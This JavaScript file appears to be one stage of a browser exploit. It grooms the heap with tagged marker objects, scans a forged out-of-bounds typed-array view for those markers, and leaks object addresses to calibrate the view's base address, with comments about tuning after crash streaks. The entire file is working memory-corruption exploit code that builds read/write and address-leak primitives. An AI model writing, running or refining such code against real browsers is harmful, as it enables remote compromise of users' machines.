// Allocate one bounded batch, then look for a live marker across a
// widened window. v2 scanned only the first 2 MiB of the forged view;
// after the 01:2x crash streak every page failed with zero candidates
// and this boot's jsarray storage index (155640) sits far from the
// historical calibration (~1.9M) — the view-relative layout has
// drifted past the old window. v3 scans min(16 MiB, view length) and
// reports the view length plus the low/high candidate offsets so the
// layout is visible even when nothing validates. Same batch/batch-
// limit/live-check logic as v2 otherwise.
var state = window.__fw14ArrayState;
var result;
var found = null;
try {
  if (!state || !state.view || !state.array || !state.a ||
      state.array[0] !== state.a || !Number.isInteger(state.index))
    throw new Error("groom_preflight_failed");
  var batchNumber = state.groomBatches ? state.groomBatches.length : 0;
  if (batchNumber >= 4) throw new Error("groom_batch_limit");
  var batch = [];
  var tag = 0x6b000000 + batchNumber * 8192;
  for (var n = 0; n < 8192; n++)
    batch.push({ marker: tag + n });
  if (!state.groomBatches) state.groomBatches = [];
  state.groomBatches.push(batch);
  if (api && typeof api.markSync === "function")
    api.markSync("groom3_batch_" + (batchNumber + 1));
  var view = state.view;
  var viewLength = view.length;
  var scanEnd = Math.min(16777216, viewLength - 4);
  var candidates = 0, lowCand = -1, highCand = -1;
  for (var i = 0; i < scanEnd; i++) {
    if (view[i + 3] !== 0x6b || view[i + 2] !== 0)
      continue;
    var index = view[i] + view[i + 1] * 256 - batchNumber * 8192;
    if (index < 0 || index >= 8192)
      continue;
    candidates++;
    if (lowCand === -1) lowCand = i;
    highCand = i;
    var object = batch[index];
    if (object.marker !== tag + index) continue;
    var live = false;
    try {
      object.marker = 0x55667788;
      live = view[i] === 0x88 && view[i + 1] === 0x77 &&
        view[i + 2] === 0x66 && view[i + 3] === 0x55;
    } finally {
      object.marker = tag + index;
    }
    if (!live) continue;
    var word = "0x";
    try {
      state.array[0] = object;
      for (var w = 7; w >= 0; w--)
        word += view[state.index + w].toString(16).padStart(2, "0");
    } finally {
      state.array[0] = state.a;
    }
    var base = Number(word) + 8 - i;
    if (!Number.isSafeInteger(base) || base <= 0 || base % 4096 !== 0)
      continue;
    object.marker = 0x11223344;
    if (view[i] !== 0x44 || view[i + 1] !== 0x33 ||
        view[i + 2] !== 0x22 || view[i + 3] !== 0x11) {
      object.marker = tag + index;
      continue;
    }
    state.addressAnchor = object;
    state.calibratedViewBase = base;
    found = { word: word, index: i, base: "0x" + base.toString(16),
      batch_index: index };
    break;
  }
  result = { id: "inrange_anchor_groom_v3",
    status: found ? "pass" : "fail",
    details: { batch: batchNumber + 1, rooted_objects: (batchNumber + 1) * 8192,
      candidates: candidates, found: !!found,
      view_length: viewLength, scan_end: scanEnd,
      low_cand: lowCand, high_cand: highCand,
      found_word: found ? found.word : "",
      found_index: found ? found.index : -1,
      found_base: found ? found.base : "",
      found_batch_index: found ? found.batch_index : -1,
      array_restored: state.array[0] === state.a } };
} catch (error) {
  result = { id: "inrange_anchor_groom_v3", status: "error",
    details: { error: String(error).slice(0, 200) } };
} finally {
  if (state && state.array && state.a) state.array[0] = state.a;
}
return [result];
